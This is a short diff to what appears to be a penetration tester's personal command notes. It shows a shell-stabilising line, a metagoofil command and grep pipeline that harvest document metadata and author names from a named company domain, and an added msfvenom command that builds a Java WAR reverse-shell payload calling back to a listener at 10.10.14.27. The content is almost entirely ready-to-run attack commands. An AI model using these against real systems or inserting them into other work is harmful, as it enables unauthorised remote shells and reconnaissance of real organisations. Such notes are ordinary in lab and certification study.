@@ -443,3 +443,7 @@ reset; sh 1>&0 2>&0
 
 metagoofil -d fiducentral.com  -t pdf,docx -l 400 -n 400 -o /home/kali/fiducentral/metadata/
 cat extract.html | grep -i Author | cut -d ":" -f 2 | sort -u
+
+******************************************msfvenom****************************************************************
+war
+msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4447 -f war > diego.war
